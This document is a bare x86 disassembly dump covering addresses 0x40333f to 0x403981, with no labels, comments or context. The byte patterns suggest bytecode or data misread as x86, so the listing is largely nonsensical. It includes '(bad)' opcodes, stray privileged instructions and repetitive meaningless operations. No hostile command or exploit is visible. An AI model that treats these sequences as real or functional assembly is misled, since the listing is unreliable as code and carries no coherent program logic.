  40333f:	add    BYTE PTR [ebx],bl
  403341:	xor    BYTE PTR [ebx],al
  403343:	add    ch,ch
  403345:	add    BYTE PTR [eax],al
  403347:	add    BYTE PTR [edi],dl
  403349:	add    BYTE PTR [eax],al
  40334b:	adc    DWORD PTR [edx],eax
  40334d:	pop    ss
  40334e:	sub    BYTE PTR ds:0x2060000,dh
  403354:	jnp    0x40336c
  403356:	add    BYTE PTR [eax],al
  403358:	add    al,0x2d
  40335a:	adc    al,BYTE PTR [edx]
  40335c:	sub    BYTE PTR [ecx],ah
  40335e:	add    BYTE PTR [eax],al
  403360:	or     dh,BYTE PTR [ebx-0x56]
  403363:	add    BYTE PTR [eax],al
  403365:	or     bh,BYTE PTR [ebp+0x16]
  403368:	add    BYTE PTR [eax],al
  40336a:	add    al,0x2b
  40336c:	or     eax,DWORD PTR [edx]
  40336e:	jnp    0x403386
  403370:	add    BYTE PTR [eax],al
  403372:	add    al,0x6f
  403374:	mov    ch,0x0
  403376:	add    BYTE PTR [edx],cl
  403378:	add    bh,BYTE PTR [ebx+0x17]
  40337b:	add    BYTE PTR [eax],al
  40337d:	add    al,0x2d
  40337f:	adc    al,BYTE PTR [edx]
  403381:	sub    BYTE PTR [ecx],ah
  403383:	add    BYTE PTR [eax],al
  403385:	or     dh,BYTE PTR [ebx-0x56]
  403388:	add    BYTE PTR [eax],al
  40338a:	or     bh,BYTE PTR [ebp+0x17]
  40338d:	add    BYTE PTR [eax],al
  40338f:	add    al,0x2b
  403391:	or     eax,DWORD PTR [edx]
  403393:	jnp    0x4033ac
  403395:	add    BYTE PTR [eax],al
  403397:	add    al,0x6f
  403399:	mov    ch,0x0
  40339b:	add    BYTE PTR [edx],cl
  40339d:	add    edx,DWORD PTR [ebx]
  40339f:	add    eax,0x38061316
  4033a4:	test   DWORD PTR [eax],eax
  4033a6:	add    BYTE PTR [eax],al
  4033a8:	adc    DWORD PTR ds:0xa9a0611,eax
  4033ae:	add    al,BYTE PTR [esi]
  4033b0:	sub    BYTE PTR [eax+0x0],al
  4033b3:	add    BYTE PTR [esi],al
  4033b5:	or     eax,DWORD PTR [edi]
  4033b7:	sub    eax,0xa428066e
  4033bc:	add    BYTE PTR [eax],al
  4033be:	or     cl,BYTE PTR [esi+eax*1]
  4033c1:	add    bh,BYTE PTR [ebx+0x1a]
  4033c4:	add    BYTE PTR [eax],al
  4033c6:	add    al,0x1b
  4033c8:	outs   dx,DWORD PTR ds:[esi]
  4033c9:	and    BYTE PTR [eax],al
  4033cb:	add    BYTE PTR [edx],cl
  4033cd:	sub    al,0x1d
  4033cf:	add    bh,BYTE PTR [ebx+0x16]
  4033d2:	add    BYTE PTR [eax],al
  4033d4:	add    al,0x8
  4033d6:	outs   dx,DWORD PTR ds:[esi]
  4033d7:	mov    dh,0x0
  4033d9:	add    BYTE PTR [edx],cl
  4033db:	sub    eax,0x167b024a
  4033e0:	add    BYTE PTR [eax],al
  4033e2:	add    al,0x8
  4033e4:	push   es
  4033e5:	outs   dx,DWORD PTR ds:[esi]
  4033e6:	stos   DWORD PTR es:[edi],eax
  4033e7:	add    BYTE PTR [eax],al
  4033e9:	or     ch,BYTE PTR [ebx]
  4033eb:	cmp    edx,DWORD PTR [ecx*1+0xb72806]
  4033f2:	add    BYTE PTR [edx],cl
  4033f4:	or     eax,0xde2603de
  4033f9:	add    BYTE PTR [ecx],cl
  4033fb:	sub    al,0xa
  4033fd:	or     DWORD PTR [edi-0x5d],ebp
  403400:	add    BYTE PTR [eax],al
  403402:	or     dl,BYTE PTR [ebx]
  403404:	add    al,0x2b
  403406:	add    ecx,DWORD PTR [eax]
  403408:	adc    eax,DWORD PTR [edx+eax*1]
  40340b:	jnp    0x403424
  40340d:	add    BYTE PTR [eax],al
  40340f:	add    al,0x11
  403411:	add    al,0x6f
  403413:	mov    dh,0x0
  403415:	add    BYTE PTR [edx],cl
  403417:	sub    eax,0x177b020e
  40341c:	add    BYTE PTR [eax],al
  40341e:	add    al,0x11
  403420:	add    al,0x6
  403422:	outs   dx,DWORD PTR ds:[esi]
  403423:	stos   DWORD PTR es:[edi],eax
  403424:	add    BYTE PTR [eax],al
  403426:	or     dl,BYTE PTR [ecx]
  403428:	push   es
  403429:	pop    ss
  40342a:	pop    eax
  40342b:	adc    eax,DWORD PTR [esi]
  40342d:	adc    DWORD PTR [esi],eax
  40342f:	adc    DWORD PTR ds:0x703f698e,eax
  403435:	(bad)  
  403436:	(bad)  
  403437:	jmp    FWORD PTR [edx]
  403439:	add    BYTE PTR [eax],al
  40343b:	add    BYTE PTR [ecx],al
  40343d:	adc    BYTE PTR [eax],al
  40343f:	add    BYTE PTR [eax],al
  403441:	add    BYTE PTR [edx+0xab0900],ah
  403447:	add    eax,DWORD PTR [ecx]
  403449:	add    BYTE PTR [eax],al
  40344b:	add    DWORD PTR [ebx],ebx
  40344d:	xor    BYTE PTR [edx],al
  40344f:	add    BYTE PTR [eax+eax*1],bh
  403452:	add    BYTE PTR [eax],al
  403454:	sldt   WORD PTR [eax]
  403457:	adc    DWORD PTR [edx],eax
  403459:	sub    BYTE PTR [eax+eax*1],ch
  40345c:	add    BYTE PTR [esi],al
  40345e:	add    dh,BYTE PTR [ebx+0x58]
  403461:	add    BYTE PTR [eax],al
  403463:	or     bh,BYTE PTR [ebp+0x1d]
  403466:	add    BYTE PTR [eax],al
  403468:	add    al,0x16
  40346a:	or     al,BYTE PTR [edx]
  40346c:	jnp    0x40348b
  40346e:	add    BYTE PTR [eax],al
  403470:	add    al,0x25
  403472:	or     edx,DWORD PTR [edx]
  403474:	add    BYTE PTR [eax],ch
  403476:	pushf  
  403477:	add    BYTE PTR [eax],al
  403479:	or     al,BYTE PTR [edx]
  40347b:	push   ss
  40347c:	sub    BYTE PTR [ebp+0x0],cl
  40347f:	add    BYTE PTR [esi],al
  403481:	add    ch,BYTE PTR [eax]
  403483:	mov    eax,0xde0a0000
  403488:	or     al,BYTE PTR [esi]
  40348a:	sub    al,0x6
  40348c:	pop    es
  40348d:	sub    BYTE PTR [esi-0x23f60000],bl
  403493:	sub    al,BYTE PTR [ecx]
  403495:	adc    BYTE PTR [eax],al
  403497:	add    BYTE PTR [edx],al
  403499:	add    BYTE PTR [ebx],dl
  40349b:	add    BYTE PTR [esi],bl
  40349d:	xor    DWORD PTR [eax],eax
  40349f:	or     al,BYTE PTR [eax]
  4034a1:	add    BYTE PTR [eax],al
  4034a3:	add    BYTE PTR [edx],cl
  4034a5:	adc    al,0x2a
  4034a7:	add    BYTE PTR [ebx],bl
  4034a9:	xor    BYTE PTR [edx],al
  4034ab:	add    BYTE PTR [ebx],ch
  4034ad:	add    BYTE PTR [eax],al
  4034af:	add    BYTE PTR [edi],cl
  4034b1:	add    BYTE PTR [eax],al
  4034b3:	adc    DWORD PTR [esi],edx
  4034b5:	or     al,BYTE PTR [edx]
  4034b7:	jnp    0x4034d6
  4034b9:	add    BYTE PTR [eax],al
  4034bb:	add    al,0x25
  4034bd:	or     edx,DWORD PTR [edx]
  4034bf:	add    BYTE PTR [eax],ch
  4034c1:	pushf  
  4034c2:	add    BYTE PTR [eax],al
  4034c4:	or     al,BYTE PTR [edx]
  4034c6:	pop    ss
  4034c7:	sub    BYTE PTR [ebp+0x0],cl
  4034ca:	add    BYTE PTR [esi],al
  4034cc:	add    ch,BYTE PTR [eax]
  4034ce:	mov    ecx,0xde0a0000
  4034d3:	or     al,BYTE PTR [esi]
  4034d5:	sub    al,0x6
  4034d7:	pop    es
  4034d8:	sub    BYTE PTR [esi-0x23f60000],bl
  4034de:	sub    al,BYTE PTR [eax]
  4034e0:	add    DWORD PTR [eax],edx
  4034e2:	add    BYTE PTR [eax],al
  4034e4:	add    al,BYTE PTR [eax]
  4034e6:	add    al,BYTE PTR [eax]
  4034e8:	push   ds
  4034e9:	and    BYTE PTR [eax],al
  4034eb:	or     al,BYTE PTR [eax]
  4034ed:	add    BYTE PTR [eax],al
  4034ef:	add    BYTE PTR [esi],bl
  4034f1:	add    bh,BYTE PTR [ebx+0x1e]
  4034f4:	add    BYTE PTR [eax],al
  4034f6:	add    al,0x2a
  4034f8:	and    al,BYTE PTR [edx]
  4034fa:	add    edi,DWORD PTR [ebp+0x1e]
  4034fd:	add    BYTE PTR [eax],al
  4034ff:	add    al,0x2a
  403501:	add    BYTE PTR [eax],al
  403503:	add    BYTE PTR [ebx],dl
  403505:	xor    BYTE PTR [edx],al
  403507:	add    BYTE PTR [edx+0x0],dh
  40350a:	add    BYTE PTR [eax],al
  40350c:	sbb    BYTE PTR [eax],al
  40350e:	add    BYTE PTR [ecx],dl
  403510:	add    dh,BYTE PTR [ebx-0x46]
  403513:	add    BYTE PTR [eax],al
  403515:	or     bh,BYTE PTR [ebp+0x22]
  403518:	add    BYTE PTR [eax],al
  40351a:	add    al,0x2
  40351c:	sub    BYTE PTR [ecx],ah
  40351e:	add    BYTE PTR [eax],al
  403520:	or     dh,BYTE PTR [ebx-0x45]
  403523:	add    BYTE PTR [eax],al
  403525:	or     bh,BYTE PTR [ebp+0x23]
  403528:	add    BYTE PTR [eax],al
  40352a:	add    al,0x2
  40352c:	jae    0x4034e8
  40352e:	add    BYTE PTR [eax],al
  403530:	or     bh,BYTE PTR [ebp+0x24]
  403533:	add    BYTE PTR [eax],al
  403535:	add    al,0x2
  403537:	jae    0x4034f3
  403539:	add    BYTE PTR [eax],al
  40353b:	or     bh,BYTE PTR [ebp+0x25]
  40353e:	add    BYTE PTR [eax],al
  403540:	add    al,0x2
  403542:	jle    0x4035c0
  403544:	add    BYTE PTR [eax],al
  403546:	or     bh,BYTE PTR [ebp+0x26]
  403549:	add    BYTE PTR [eax],al
  40354b:	add    al,0x2
  40354d:	sub    BYTE PTR [eax+0x0],bl
  403550:	add    BYTE PTR [edx],cl
  403552:	add    ebp,DWORD PTR ds:0x316720b
  403558:	add    BYTE PTR [eax+0x73],dh
  40355b:	mov    esp,0x7a0a0000
  403560:	add    ecx,DWORD PTR [ebx]
  403562:	push   ss
  403563:	or     al,0x2b
  403565:	sysret 
  403567:	or     BYTE PTR [edx+0x2806020a],bl
  40356d:	popa   
  40356e:	add    BYTE PTR [eax],al
  403570:	push   es
  403571:	or     BYTE PTR [edi],dl
  403573:	pop    eax
  403574:	or     al,0x8
  403576:	pop    es
  403577:	mov    gs,WORD PTR [ecx+0x32]
  40357a:	jmp    0x40357e
  40357c:	sub    BYTE PTR [edi+0x0],cl
  40357f:	add    BYTE PTR [esi],al
  403581:	sub    al,BYTE PTR [eax]
  403583:	add    BYTE PTR [ebx],dl
  403585:	xor    BYTE PTR [ebx],al
  403587:	add    BYTE PTR [ebx+0x0],ah
  40358a:	add    BYTE PTR [eax],al
  40358c:	sbb    DWORD PTR [eax],eax
  40358e:	add    BYTE PTR [ecx],dl
  403590:	add    bh,BYTE PTR [ebx+0x22]
  403593:	add    BYTE PTR [eax],al
  403595:	add    al,0x7e
  403597:	sub    DWORD PTR [eax],eax
  403599:	add    BYTE PTR [edi+ebp*2],al
  40359c:	mov    ebp,0x160a0000
  4035a1:	or     ch,BYTE PTR [ebx]
  4035a3:	inc    eax
  4035a4:	add    bh,BYTE PTR [ebx+0x22]
  4035a7:	add    BYTE PTR [eax],al
  4035a9:	add    al,0x6
  4035ab:	outs   dx,DWORD PTR ds:[esi]
  4035ac:	mov    esi,0x740a0000
  4035b1:	sldt   WORD PTR [eax]
  4035b4:	add    cl,BYTE PTR [ebx]
  4035b6:	add    bh,BYTE PTR [ebx+0x23]
  4035b9:	add    BYTE PTR [eax],al
  4035bb:	add    al,0x7
  4035bd:	outs   dx,DWORD PTR ds:[esi]
  4035be:	jno    0x4035c0
  4035c0:	add    BYTE PTR [esi],al
  4035c2:	outs   dx,DWORD PTR ds:[esi]
  4035c3:	mov    edi,0x2d0a0000
  4035c8:	pop    ss
  4035c9:	add    bh,BYTE PTR [ebx+0x23]
  4035cc:	add    BYTE PTR [eax],al
  4035ce:	add    al,0x7
  4035d0:	outs   dx,DWORD PTR ds:[esi]
  4035d1:	jno    0x4035d3
  4035d3:	add    BYTE PTR [esi],al
  4035d5:	push   es
  4035d6:	mov    WORD PTR [esi+0x0],?
  4035d9:	add    BYTE PTR [ecx],al
  4035db:	outs   dx,DWORD PTR ds:[esi]
  4035dc:	rol    BYTE PTR [eax],0x0
  4035df:	or     al,BYTE PTR [esi]
  4035e1:	pop    ss
  4035e2:	pop    eax
  4035e3:	or     al,BYTE PTR [esi]
  4035e5:	add    bh,BYTE PTR [ebx+0x22]
  4035e8:	add    BYTE PTR [eax],al
  4035ea:	add    al,0x6f
  4035ec:	rol    DWORD PTR [eax],0x0
  4035ef:	or     dh,BYTE PTR [edx]
  4035f1:	mov    dl,0x2a
  4035f3:	outs   dx,BYTE PTR ds:[esi]
  4035f4:	add    bh,BYTE PTR [ebx+0x24]
  4035f7:	add    BYTE PTR [eax],al
  4035f9:	add    al,0xd0
  4035fb:	add    BYTE PTR ss:[eax],al
  4035fe:	add    DWORD PTR [eax],ebp
  403600:	inc    esi
  403601:	add    BYTE PTR [eax],al
  403603:	or     ch,BYTE PTR [edi-0x3e]
  403606:	add    BYTE PTR [eax],al
  403608:	or     dh,BYTE PTR [eax+edx*1+0x0]
  40360c:	add    BYTE PTR [ebx],bl
  40360e:	sub    ch,BYTE PTR [esi+0x2]
  403611:	jnp    0x403638
  403613:	add    BYTE PTR [eax],al
  403615:	add    al,0xd0
  403617:	imul   eax,DWORD PTR [eax],0x46280100
  40361d:	add    BYTE PTR [eax],al
  40361f:	or     ch,BYTE PTR [edi-0x3e]
  403622:	add    BYTE PTR [eax],al
  403624:	or     dh,BYTE PTR [ecx+edx*1+0x0]
  403628:	add    BYTE PTR [ebx],bl
  40362a:	sub    bl,BYTE PTR [esi]
  40362c:	add    bh,BYTE PTR [ebx+0x22]
  40362f:	add    BYTE PTR [eax],al
  403631:	add    al,0x2a
  403633:	add    BYTE PTR [ebx],dl
  403635:	xor    BYTE PTR [ebx],al
  403637:	add    BYTE PTR [eax+eax*1],ch
  40363a:	add    BYTE PTR [eax],al
  40363c:	sbb    al,BYTE PTR [eax]
  40363e:	add    BYTE PTR [ecx],dl
  403640:	add    al,BYTE PTR [ebx]
  403642:	sub    BYTE PTR [esi+0x0],bl
  403645:	add    BYTE PTR [esi],al
  403647:	or     al,BYTE PTR [esi]
  403649:	sub    al,0x1f
  40364b:	push   es
  40364c:	outs   dx,DWORD PTR ds:[esi]
  40364d:	jo     0x40364f
  40364f:	add    BYTE PTR [esi],al
  403651:	sub    BYTE PTR [eax+0x2d0a0000],bl
  403657:	adc    al,BYTE PTR [esi]
  403659:	outs   dx,DWORD PTR ds:[esi]
  40365a:	jo     0x40365c
  40365c:	add    BYTE PTR [esi],al
  40365e:	jb     0x40369c
  403660:	add    eax,DWORD PTR [eax]
  403662:	jo     0x40367f
  403664:	outs   dx,DWORD PTR ds:[esi]
  403665:	and    BYTE PTR [eax],al
  403667:	add    BYTE PTR [edx],cl
  403669:	sub    dl,BYTE PTR [esi]
  40366b:	sub    dl,BYTE PTR [ebx]
  40366d:	xor    BYTE PTR [edx],al
  40366f:	add    BYTE PTR [eax+eax*1],dl
  403672:	add    BYTE PTR [eax],al
  403674:	sbb    al,BYTE PTR [eax]
  403676:	add    BYTE PTR [ecx],dl
  403678:	add    al,BYTE PTR [ebx]
  40367a:	sub    BYTE PTR [esi+0x0],bl
  40367d:	add    BYTE PTR [esi],al
  40367f:	or     al,BYTE PTR [esi]
  403681:	sub    al,0x7
  403683:	push   es
  403684:	outs   dx,DWORD PTR ds:[esi]
  403685:	outs   dx,BYTE PTR ds:[esi]
  403686:	add    BYTE PTR [eax],al
  403688:	push   es
  403689:	sub    dl,BYTE PTR [esi]
  40368b:	sub    dl,BYTE PTR [ebx]
  40368d:	xor    BYTE PTR [edx],al
  40368f:	add    BYTE PTR [eax+eax*1],bl
  403692:	add    BYTE PTR [eax],al
  403694:	sbb    eax,DWORD PTR [eax]
  403696:	add    BYTE PTR [ecx],dl
  403698:	add    al,BYTE PTR [ebx]
  40369a:	sub    BYTE PTR [esi+0x0],bl
  40369d:	add    BYTE PTR [esi],al
  40369f:	or     al,BYTE PTR [esi]
  4036a1:	sub    al,0x7
  4036a3:	push   es
  4036a4:	outs   dx,DWORD PTR ds:[esi]
  4036a5:	outs   dx,DWORD PTR ds:[esi]
  4036a6:	add    BYTE PTR [eax],al
  4036a8:	push   es
  4036a9:	sub    dl,BYTE PTR [edx]
  4036ab:	add    esi,edi
  4036ad:	adc    eax,0x1b000012
  4036b2:	pop    es
  4036b3:	sub    dl,BYTE PTR [ebx]
  4036b5:	xor    BYTE PTR [eax+eax*1],al
  4036b8:	inc    edx
  4036b9:	add    BYTE PTR [eax],al
  4036bb:	add    BYTE PTR [eax+eax*1],bl
  4036be:	add    BYTE PTR [ecx],dl
  4036c0:	pop    ss
  4036c1:	sub    BYTE PTR [eax+0xa0a0000],cl
  4036c7:	push   ss
  4036c8:	lea    ebp,[ecx+0x0]
  4036cb:	add    BYTE PTR [ecx],al
  4036cd:	or     eax,DWORD PTR [esi]
  4036cf:	sub    al,0x7
  4036d1:	push   es
  4036d2:	sub    BYTE PTR [edx+0x0],bl
  4036d5:	add    BYTE PTR [esi],al
  4036d7:	or     eax,DWORD PTR [edi]
  4036d9:	mov    gs,WORD PTR [ecx-0x73]
  4036dc:	push   cs
  4036dd:	add    BYTE PTR [eax],al
  4036df:	add    cl,BYTE PTR [esi+edx*1]
  4036e2:	or     eax,0x908102b
  4036e7:	pop    es
  4036e8:	or     DWORD PTR [edx+0x677306],ebx
  4036ee:	add    BYTE PTR [esi],al
  4036f0:	mov    ds:0xd581709,al
  4036f5:	or     DWORD PTR [edi],eax
  4036f7:	mov    gs,WORD PTR [ecx+0x32]
  4036fa:	jmp    0x600:0x5c2808
  403701:	sub    bl,BYTE PTR [esi]
  403703:	sbb    BYTE PTR [eax],ch
  403705:	pop    ecx
  403706:	add    BYTE PTR [eax],al
  403708:	push   es
  403709:	sub    bl,BYTE PTR [esi]
  40370b:	sbb    DWORD PTR [eax],ebp
  40370d:	pop    ecx
  40370e:	add    BYTE PTR [eax],al
  403710:	push   es
  403711:	sub    al,BYTE PTR [eax]
  403713:	add    BYTE PTR [ebx],dl
  403715:	xor    BYTE PTR [eax+eax*1],al
  403718:	inc    ebx
  403719:	add    BYTE PTR [eax],al
  40371b:	add    BYTE PTR [eax+eax*1],bl
  40371e:	add    BYTE PTR [ecx],dl
  403720:	add    ch,BYTE PTR [eax]
  403722:	ret    
  403723:	add    BYTE PTR [eax],al
  403725:	or     cl,BYTE PTR [edx]
  403727:	push   es
  403728:	sub    al,0x8
  40372a:	push   es
  40372b:	sub    BYTE PTR [edx+0x0],bl
  40372e:	add    BYTE PTR [esi],al
  403730:	sub    eax,DWORD PTR [esi]
  403732:	push   ss
  403733:	lea    ebp,[ecx+0x0]
  403736:	add    BYTE PTR [ecx],al
  403738:	or     eax,DWORD PTR [edi]
  40373a:	mov    gs,WORD PTR [ecx-0x73]
  40373d:	push   cs
  40373e:	add    BYTE PTR [eax],al
  403740:	add    cl,BYTE PTR [esi+edx*1]
  403743:	or     eax,0x908102b
  403748:	pop    es
  403749:	or     DWORD PTR [edx+0x677306],ebx
  40374f:	add    BYTE PTR [esi],al
  403751:	mov    ds:0xd581709,al
  403756:	or     DWORD PTR [edi],eax
  403758:	mov    gs,WORD PTR [ecx+0x32]
  40375b:	jmp    0x600:0x5c2808
  403762:	sub    al,BYTE PTR [eax]
  403764:	adc    esi,DWORD PTR [eax]
  403766:	add    eax,DWORD PTR [eax]
  403768:	outs   dx,BYTE PTR ds:[esi]
  403769:	add    BYTE PTR [eax],al
  40376b:	add    BYTE PTR ds:0x7e110000,bl
  403771:	sub    BYTE PTR [eax],al
  403773:	add    BYTE PTR [ebp*1+0x21280f],al
  40377a:	add    BYTE PTR [edx],cl
  40377c:	jae    0x403742
  40377e:	add    BYTE PTR [eax],al
  403780:	or     al,BYTE PTR [eax+0x4000028]
  403786:	jle    0x4037b0
  403788:	add    BYTE PTR [eax],al
  40378a:	add    al,0x2
  40378c:	outs   dx,DWORD PTR ds:[esi]
  40378d:	lds    eax,FWORD PTR [eax]
  40378f:	add    BYTE PTR [edx],cl
  403791:	sub    eax,0xc0720238
  403796:	add    al,BYTE PTR [eax]
  403798:	jo     0x4037c2
  40379a:	xchg   esp,eax
  40379b:	add    BYTE PTR [eax],al
  40379d:	or     cl,BYTE PTR [edx]
  40379f:	push   es
  4037a0:	sub    dh,al
  4037a2:	add    BYTE PTR [eax],al
  4037a4:	or     ch,BYTE PTR [eax+esi*1]
  4037a7:	push   es
  4037a8:	jb     0x403822
  4037aa:	add    eax,DWORD PTR [eax]
  4037ac:	jo     0x4037d6
  4037ae:	mov    DWORD PTR [eax],0x7e0b0a00
  4037b4:	sub    BYTE PTR [eax],al
  4037b6:	add    BYTE PTR [edx+eax*1],al
  4037b9:	pop    es
  4037ba:	outs   dx,DWORD PTR ds:[esi]
  4037bb:	enter  0x0,0xa
  4037bf:	jle    0x4037e9
  4037c1:	add    BYTE PTR [eax],al
  4037c3:	add    al,0x2
  4037c5:	outs   dx,DWORD PTR ds:[esi]
  4037c6:	leave  
  4037c7:	add    BYTE PTR [eax],al
  4037c9:	or     ch,BYTE PTR [edx]
  4037cb:	jle    0x4037f5
  4037cd:	add    BYTE PTR [eax],al
  4037cf:	add    al,0x2
  4037d1:	outs   dx,DWORD PTR ds:[esi]
  4037d2:	leave  
  4037d3:	add    BYTE PTR [eax],al
  4037d5:	or     ch,BYTE PTR [edx]
  4037d7:	push   ss
  4037d8:	lea    ebp,[ecx+0x0]
  4037db:	add    BYTE PTR [ecx],al
  4037dd:	sub    al,BYTE PTR [eax]
  4037df:	add    BYTE PTR [ebx],dl
  4037e1:	xor    BYTE PTR [edx],al
  4037e3:	add    BYTE PTR [eax+eax*1],dl
  4037e6:	add    BYTE PTR [eax],al
  4037e8:	sbb    al,BYTE PTR [eax]
  4037ea:	add    BYTE PTR [ecx],dl
  4037ec:	add    al,BYTE PTR [ebx]
  4037ee:	sub    BYTE PTR [esi+0x0],bl
  4037f1:	add    BYTE PTR [esi],al
  4037f3:	or     al,BYTE PTR [esi]
  4037f5:	sub    al,0x7
  4037f7:	push   es
  4037f8:	outs   dx,DWORD PTR ds:[esi]
  4037f9:	jo     0x4037fb
  4037fb:	add    BYTE PTR [esi],al
  4037fd:	sub    dl,BYTE PTR [edx+ebp*1]
  403800:	adc    esi,DWORD PTR [eax]
  403802:	add    eax,DWORD PTR [eax]
  403804:	pop    DWORD PTR [eax]
  403806:	add    BYTE PTR [eax],al
  403808:	push   ds
  403809:	add    BYTE PTR [eax],al
  40380b:	adc    DWORD PTR [edx],eax
  40380d:	sub    eax,0x384720b
  403812:	add    BYTE PTR [eax+0x73],dh
  403815:	mov    esp,0x7a0a0000
  40381a:	add    ch,BYTE PTR [eax]
  40381c:	add    eax,DWORD PTR [eax]
  40381e:	add    BYTE PTR [ebx],ch
  403820:	add    cl,BYTE PTR [esi+0x7301669]
  403826:	jae    0x4037f3
  403828:	add    BYTE PTR [eax],al
  40382a:	or     ch,BYTE PTR [ebx]
  40382c:	or     eax,0x6f9a1602
  403831:	push   0x0
  403833:	add    BYTE PTR [esi],al
  403835:	jae    0x403803
  403837:	add    BYTE PTR [eax],al
  403839:	or     cl,BYTE PTR [edx]
  40383b:	pop    ss
  40383c:	or     ebp,DWORD PTR [ebx]
  40383e:	sbb    al,0x6
  403840:	pop    ds
  403841:	cmp    ebp,DWORD PTR [edi-0x33]
  403844:	add    BYTE PTR [eax],al
  403846:	or     ah,BYTE PTR [esi]
  403848:	push   es
  403849:	add    al,BYTE PTR [edi]
  40384b:	call   0x6f06:0x6a6f
  403852:	into   
  403853:	add    BYTE PTR [eax],al
  403855:	or     ah,BYTE PTR [esi]
  403857:	pop    es
  403858:	pop    ss
  403859:	pop    eax
  40385a:	or     eax,DWORD PTR [edi]
  40385c:	add    cl,BYTE PTR [esi+0x6de3269]
  403862:	outs   dx,DWORD PTR ds:[esi]
  403863:	iret   
  403864:	add    BYTE PTR [eax],al
  403866:	or     cl,BYTE PTR [esi+edi*2]
  403869:	and    DWORD PTR [eax],eax
  40386b:	add    BYTE PTR [eax+ecx*1],al
  40386e:	outs   dx,DWORD PTR ds:[esi]
  40386f:	mov    edi,0x2c0a0000
  403874:	adc    DWORD PTR [esi+0x21],edi
  403877:	add    BYTE PTR [eax],al
  403879:	add    al,0x8
  40387b:	outs   dx,DWORD PTR ds:[esi]
  40387c:	rol    BYTE PTR [eax],1
  40387e:	add    BYTE PTR [edx],cl
  403880:	je     0x40388d
  403882:	add    BYTE PTR [eax],al
  403884:	add    ch,BYTE PTR [edx]
  403886:	add    dh,BYTE PTR [ebx+0x4e]
  403889:	add    BYTE PTR [eax],al
  40388b:	push   es
  40388c:	or     eax,0x217e
  403891:	add    al,0x8
  403893:	or     DWORD PTR [edi-0x40],ebp
  403896:	add    BYTE PTR [eax],al
  403898:	or     cl,BYTE PTR [ecx]
  40389a:	sub    al,BYTE PTR [eax]
  40389c:	adc    esi,DWORD PTR [eax]
  40389e:	add    eax,DWORD PTR [eax]
  4038a0:	sub    al,BYTE PTR [eax]
  4038a2:	add    BYTE PTR [eax],al
  4038a4:	pop    ds
  4038a5:	add    BYTE PTR [eax],al
  4038a7:	adc    DWORD PTR [edx],eax
  4038a9:	sub    eax,0x3a2720b
  4038ae:	add    BYTE PTR [eax+0x73],dh
  4038b1:	mov    esp,0x7a0a0000
  4038b6:	add    dh,BYTE PTR [edx-0x44]
  4038b9:	add    eax,DWORD PTR [eax]
  4038bb:	jo     0x4038d7
  4038bd:	outs   dx,DWORD PTR ds:[esi]
  4038be:	rol    DWORD PTR [eax],1
  4038c0:	add    BYTE PTR [edx],cl
  4038c2:	or     al,BYTE PTR [esi]
  4038c4:	push   ss
  4038c5:	xor    BYTE PTR [edx],al
  4038c7:	add    ch,BYTE PTR [edx]
  4038c9:	add    dl,BYTE PTR [esi]
  4038cb:	push   es
  4038cc:	outs   dx,DWORD PTR ds:[esi]
  4038cd:	rol    BYTE PTR [eax],cl
  4038cf:	add    BYTE PTR [edx],cl
  4038d1:	sub    bl,BYTE PTR [esi]
  4038d3:	add    bh,BYTE PTR [ebx+0x27]
  4038d6:	add    BYTE PTR [eax],al
  4038d8:	add    al,0x2a
  4038da:	add    BYTE PTR [eax],al
  4038dc:	adc    esi,DWORD PTR [eax]
  4038de:	add    al,BYTE PTR [eax]
  4038e0:	adc    al,0x0
  4038e2:	add    BYTE PTR [eax],al
  4038e4:	sbb    al,BYTE PTR [eax]
  4038e6:	add    BYTE PTR [ecx],dl
  4038e8:	add    al,BYTE PTR [ebx]
  4038ea:	sub    BYTE PTR [esi+0x0],bl
  4038ed:	add    BYTE PTR [esi],al
  4038ef:	or     al,BYTE PTR [esi]
  4038f1:	sub    al,0x7
  4038f3:	push   es
  4038f4:	outs   dx,DWORD PTR ds:[esi]
  4038f5:	ins    DWORD PTR es:[edi],dx
  4038f6:	add    BYTE PTR [eax],al
  4038f8:	push   es
  4038f9:	sub    al,BYTE PTR [ebx]
  4038fb:	sub    dl,BYTE PTR [ebx]
  4038fd:	xor    BYTE PTR [ebx],al
  4038ff:	add    BYTE PTR [esi+0x0],bh
  403902:	add    BYTE PTR [eax],al
  403904:	and    BYTE PTR [eax],al
  403906:	add    BYTE PTR [ecx],dl
  403908:	jae    0x4038dd
  40390a:	add    BYTE PTR [eax],al
  40390c:	or     cl,BYTE PTR [edx]
  40390e:	add    bh,BYTE PTR [ebx+0x23]
  403911:	add    BYTE PTR [eax],al
  403913:	add    al,0x3
  403915:	outs   dx,DWORD PTR ds:[esi]
  403916:	mov    edi,0x2c0a0000
  40391b:	arpl   WORD PTR [edx],ax
  40391d:	jnp    0x403942
  40391f:	add    BYTE PTR [eax],al
  403921:	add    al,0x3
  403923:	outs   dx,DWORD PTR ds:[esi]
  403924:	rol    BYTE PTR [eax],1
  403926:	add    BYTE PTR [edx],cl
  403928:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403929:	jle    0x40392b
  40392b:	add    BYTE PTR [ecx],al
  40392d:	or     eax,DWORD PTR [edi]
  40392f:	or     al,0x2b
  403931:	aas    
  403932:	add    bh,BYTE PTR [ebx+0x22]
  403935:	add    BYTE PTR [eax],al
  403937:	add    al,0x8
  403939:	outs   dx,DWORD PTR ds:[esi]
  40393a:	mov    esi,0x740a0000
  40393f:	sldt   WORD PTR [eax]
  403942:	add    cl,BYTE PTR ds:0x716f0903
  403948:	add    BYTE PTR [eax],al
  40394a:	push   es
  40394b:	sbb    ebp,DWORD PTR [eax]
  40394d:	xchg   edi,eax
  40394e:	add    BYTE PTR [eax],al
  403950:	or     ch,BYTE PTR [esp+ebp*1]
  403953:	push   es
  403954:	or     DWORD PTR [edi-0x2c],ebp
  403957:	add    BYTE PTR [eax],al
  403959:	or     al,BYTE PTR [edx]
  40395b:	or     DWORD PTR [edi+0x6d],ebp
  40395e:	add    BYTE PTR [eax],al
  403960:	push   es
  403961:	jge    0x403989
  403963:	add    BYTE PTR [eax],al
  403965:	add    al,0x2
  403967:	or     DWORD PTR [ebp+0x27],edi
  40396a:	add    BYTE PTR [eax],al
  40396c:	add    al,0x8
  40396e:	pop    ss
  40396f:	pop    eax
  403970:	or     al,0x8
  403972:	add    bh,BYTE PTR [ebx+0x22]
  403975:	add    BYTE PTR [eax],al
  403977:	add    al,0x6f
  403979:	rol    DWORD PTR [eax],0x0
  40397c:	or     dh,BYTE PTR [edx]
  40397e:	mov    bl,0x6
  403980:	outs   dx,DWORD PTR ds:[esi]
  403981:	aad    0x0
